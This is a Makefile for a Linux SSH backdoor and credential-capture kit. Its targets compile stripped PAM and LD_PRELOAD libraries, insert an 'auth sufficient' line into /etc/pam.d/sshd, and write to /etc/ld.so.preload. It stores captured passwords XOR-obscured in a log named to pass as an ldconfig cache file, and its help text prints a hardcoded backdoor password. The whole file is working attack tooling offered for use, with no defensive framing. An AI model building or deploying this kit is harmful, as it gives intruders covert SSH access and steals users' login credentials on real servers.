# PAM Backdoor + Credential Capture
# Usage: make help

CC = gcc
CFLAGS = -fPIC -shared -O2 -fvisibility=hidden
STRIP = strip --strip-all

# Detect PAM path
PAM_DIR := $(shell \
	if [ -d /lib/x86_64-linux-gnu/security ]; then echo /lib/x86_64-linux-gnu/security; \
	elif [ -d /lib64/security ]; then echo /lib64/security; \
	elif [ -d /usr/lib/security ]; then echo /usr/lib/security; \
	else echo /lib/security; fi)

.PHONY: all clean install uninstall deploy-hook remove-hook creds help

all: pam_auth.so pam_hook.so

pam_auth.so: pam_auth.c
	$(CC) $(CFLAGS) -o $@ $< -lpam
	$(STRIP) $@

pam_hook.so: pam_hook.c
	$(CC) -fPIC -shared -o $@ $< -ldl
	$(STRIP) $@

clean:
	rm -f pam_auth.so pam_hook.so

# Install PAM module
install: pam_auth.so
	@echo "Installing to $(PAM_DIR)..."
	cp pam_auth.so $(PAM_DIR)/
	chmod 644 $(PAM_DIR)/pam_auth.so
	@if ! grep -q 'pam_auth.so' /etc/pam.d/sshd; then \
		sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd; \
		echo "Added to /etc/pam.d/sshd"; \
	else \
		echo "Already in /etc/pam.d/sshd"; \
	fi

# Remove PAM module
uninstall:
	sed -i '/pam_auth.so/d' /etc/pam.d/sshd
	rm -f $(PAM_DIR)/pam_auth.so
	@echo "PAM module removed"

# Deploy LD_PRELOAD hook (for OpenSSH 9.x)
deploy-hook: pam_hook.so
	cp pam_hook.so /lib/
	echo "/lib/pam_hook.so" > /etc/ld.so.preload
	@echo "Hook deployed. Restart sshd to activate."

# Remove hook
remove-hook:
	rm -f /lib/pam_hook.so /etc/ld.so.preload
	@echo "Hook removed"

# Full install (PAM + Hook)
full-install: install deploy-hook
	@echo "Full installation complete"

# Full uninstall
full-uninstall: uninstall remove-hook
	rm -f /var/cache/ldconfig/aux-cache.log
	@echo "Full uninstallation complete"

# Read captured credentials
creds:
	@python3 -c "\
key = b'ld.so.cache'; \
import os; \
f = '/var/cache/ldconfig/aux-cache.log'; \
data = open(f, 'rb').read() if os.path.exists(f) else b''; \
out = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))]); \
print(out.decode() if data else 'No credentials captured')"

# Clear captured credentials
clear-creds:
	rm -f /var/cache/ldconfig/aux-cache.log
	@echo "Credentials cleared"

help:
	@echo "Usage:"
	@echo "  make              - Build pam_auth.so and pam_hook.so"
	@echo "  make install      - Install PAM module"
	@echo "  make uninstall    - Remove PAM module"
	@echo "  make deploy-hook  - Deploy LD_PRELOAD hook (OpenSSH 9.x)"
	@echo "  make remove-hook  - Remove hook"
	@echo "  make full-install - Install PAM + Hook"
	@echo "  make full-uninstall - Remove everything"
	@echo "  make creds        - Read captured credentials"
	@echo "  make clear-creds  - Clear credential log"
	@echo "  make clean        - Remove compiled files"
	@echo ""
	@echo "Backdoor password: behumbl3"
	@echo "PAM directory: $(PAM_DIR)"
